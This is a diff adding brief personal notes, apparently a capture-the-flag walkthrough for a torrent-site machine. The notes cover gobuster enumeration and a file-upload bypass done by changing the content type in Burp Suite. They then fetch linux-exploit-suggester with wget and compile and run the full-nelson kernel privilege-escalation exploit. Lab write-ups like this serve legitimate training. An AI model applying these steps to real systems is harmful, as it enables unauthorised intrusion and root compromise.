@@ -1,0 +1,14 @@
+gobuuster find torrent
+create account upload torrent
+find edit can upload image and png
+user burpsuite change content type to  image/png
+
+go to tmp for directory have executor permission
+wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O les.sh
+cant wget from github so use simplehttp
+chmod +x
+
+Linux Kernel <= 2.6.37 local privilege escalation
+
+gcc full-nelson.c -o full-nelson
+./full-nelson
